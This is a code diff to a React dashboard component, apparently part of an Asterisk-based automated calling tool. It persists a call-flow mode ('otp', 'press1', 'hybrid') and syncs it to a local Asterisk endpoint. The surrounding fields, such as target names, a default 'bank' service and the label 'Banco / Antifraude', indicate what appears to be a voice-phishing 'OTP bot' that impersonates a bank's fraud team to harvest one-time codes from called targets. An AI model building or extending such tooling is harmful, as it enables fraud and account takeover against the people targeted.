@@ -99,7 +99,28 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const [targetName, setTargetName] = useState('');
   const [selectedService, setSelectedService] = useState<ServiceCampaignKey>('bank');
   const [customServiceName, setCustomServiceName] = useState('Servicio Financiero');
-  const [callFlowMode, setCallFlowMode] = useState<'otp' | 'press1' | 'hybrid'>('otp');
+  const [callFlowMode, setCallFlowModeState] = useState<'otp' | 'press1' | 'hybrid'>(() => {
+    try {
+      const saved = localStorage.getItem('ast20_call_flow_mode');
+      if (saved === 'otp' || saved === 'press1' || saved === 'hybrid') {
+        return saved;
+      }
+    } catch (_) {}
+    return 'press1';
+  });
+
+  const setCallFlowMode = (mode: 'otp' | 'press1' | 'hybrid') => {
+    setCallFlowModeState(mode);
+    try {
+      localStorage.setItem('ast20_call_flow_mode', mode);
+      fetch('/api/asterisk/action/set-default', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ mode }),
+      }).catch(() => {});
+    } catch (_) {}
+  };
+
   const [agentExtension, setAgentExtension] = useState('1001');
 
   // Initial predefined campaign templates
@@ -513,6 +534,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       }
     }
   }, [agentExtension, extensions]);
+
+  // Ensure default action is synced to Asterisk on mount
+  useEffect(() => {
+    fetch('/api/asterisk/action/set-default', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ mode: callFlowMode }),
+    }).catch(() => {});
+  }, []);
 
   const activeSelectedEntity = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
   const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Banco / Antifraude';
